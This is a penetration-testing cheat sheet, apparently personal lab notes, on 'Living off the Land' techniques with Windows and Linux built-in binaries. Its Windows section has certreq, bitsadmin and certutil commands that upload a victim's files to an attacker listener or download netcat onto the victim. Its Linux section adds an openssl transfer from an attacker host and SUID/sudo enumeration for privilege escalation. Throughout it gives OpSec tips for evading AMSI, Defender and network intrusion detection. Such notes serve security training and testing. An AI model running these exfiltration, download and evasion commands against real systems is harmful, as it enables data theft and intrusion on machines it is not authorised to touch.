
>[!ABSTRACT] **Living Off The Land (LotL) Methodology**

LotL involves using legitimate, pre-installed system binaries (**LOLBins** for Windows and **GTFOBins** for Linux) to execute malicious actions. This bypasses many security controls because the tools themselves are trusted by the OS.

---

>[!INFO] **Primary LotL Resources**

- **Windows:** [LOLBAS Project](https://lolbas-project.github.io/)
    
- **Linux:** [GTFOBins](https://gtfobins.github.io/)
    

---

>[!TIP] **Windows LotL Transfers (LOLBAS)**

#### **1. CertReq.exe (Upload)**

Used to exfiltrate files by sending a POST request to an attacker-controlled listener.

> [!Note] **Attacker (Listener)**
> 
> Bash
> 
> ```
> # Start a Netcat listener to catch the POST data
> sudo nc -lvnp 8000
> ```

> [!ATTENTION] **Receiver / Victim (Exfiltrating File)**
> 
> DOS
> 
> ```
> # Upload a sensitive file to the attacker's IP
> certreq.exe -Post -config http://10.10.14.x:8000/ c:\windows\win.ini
> ```

#### **2. Bitsadmin (Download)**

A background service used for job scheduling that can be abused to grab tools.

> [!Note] **Attacker (Host File)**
> 
> Bash
> 
> ```
> python3 -m http.server 8000
> ```

> [!ATTENTION] **Receiver / Victim (Downloading)**
> 
> PowerShell
> 
> ```
> # Method A: Command Prompt
> bitsadmin /transfer ncwd /priority foreground http://10.10.14.x:8000/nc.exe C:\Users\Public\nc.exe
> 
> # Method B: PowerShell Module
> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.14.x:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
> ```

#### **3. Certutil.exe (Download)**

The "Classic" Windows download method.

> [!WARNING] **OpSec Alert**
> 
> Modern Windows Defender and **AMSI** (Antimalware Scan Interface) highly monitor `certutil` for web downloads.

> [!ATTENTION] **Receiver / Victim (Downloading)**
> 
> DOS
> 
> ```
> certutil.exe -verifyctl -split -f http://10.10.14.x:8000/nc.exe
> ```

---

>[!TIP] **Linux LotL Transfers (GTFOBins)**

#### **OpenSSL (Encrypted Transfer)**

OpenSSL can act like a secure version of Netcat for file movement.

> [!Note] **Attacker (Setup Encrypted Server)**
> 
> Bash
> 
> ```
> # 1. Generate a temporary certificate
> openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
> 
> # 2. Start the server and pipe the file you want to send
> openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
> ```

> [!ATTENTION] **Receiver / Victim (Downloading)**
> 
> Bash
> 
> ```
> # Connect to the attacker's OpenSSL server to pull the file
> openssl s_client -connect <ATTACKER_IP>:80 -quiet > LinEnum.sh
> ```

---

>[!CAUTION] **Operational Security (OpSec)**

- **AMSI Detection:** Certutil is almost always flagged now. If `certutil` fails, pivot to `bitsadmin` or `Invoke-WebRequest`.
    
- **CertReq Versions:** If the `-Post` flag is missing, the binary version on the target is likely outdated.
    
- **Encryption:** The OpenSSL method is preferred over standard Netcat because it hides the file contents from Network IDS (Intrusion Detection Systems).
    

---

>[!CHECK] **Cheat Sheet Summary**

| **Binary**    | **Platform** | **Function**    | **Protocol** |
| ------------- | ------------ | --------------- | ------------ |
| **CertReq**   | Windows      | Upload          | HTTP POST    |
| **Bitsadmin** | Windows      | Download        | HTTP/SMB     |
| **Certutil**  | Windows      | Download        | HTTP         |
| **OpenSSL**   | Linux        | Download/Upload | SSL/TLS      |


>[!TIP] **Enumeration on Linux (GTFOBins)**

On Linux, we primarily look for binaries with the **SUID** (Set User ID) bit set, or common utilities that can be abused for file transfers and shells.

> [!Note] **Attacker (Initial Foothold)**
> 
> Bash
> 
> ```
> # 1. Find all SUID binaries (Top priority for PrivEsc)
> find / -perm -u=s -type f 2>/dev/null
> 
> # 2. Check for common 'Living off the Land' utilities
> which nc ncat openssl wget curl base64 python python3 perl ruby gcc 2>/dev/null
> 
> # 3. Check current user's sudo privileges (requires password)
> sudo -l
> ```


>[!SUCCESS] **Automated Tool: LinPEAS** This is the gold standard for Linux enumeration. It will automatically cross-reference found binaries with the **GTFOBins** database.

Bash

```
# Run LinPEAS (assuming it's uploaded to /tmp)
chmod +x linpeas.sh
./linpeas.sh
```


>[!TIP] **Enumeration on Windows (LOLBAS)**

Windows enumeration focuses on built-in "Feature" binaries like `certutil`, `bitsadmin`, and `powershell`.

> [!Note] **Attacker (Initial Foothold)**
> 
 > CMD.EXE
> 
> ```
> # 1. Check if common LOLBins exist in the path
> where certutil bitsadmin findstr powershell.exe certreq.exe
> 
>  #Powershell
> # 2. Check for installed 3rd party software that might have binaries
> Get-ChildItem "C:\Program Files", "C:\Program Files (x86)" | select Name
> 
> # 3. List all running processes (finds binaries currently in use)
> tasklist /v
> ```

> [!SUCCESS] **Automated Tool: WinPEAS** Like its Linux counterpart, WinPEAS searches for misconfigurations and LOLBins.
> 
> DOS
> 
> ```
> winPEASany.exe
> ```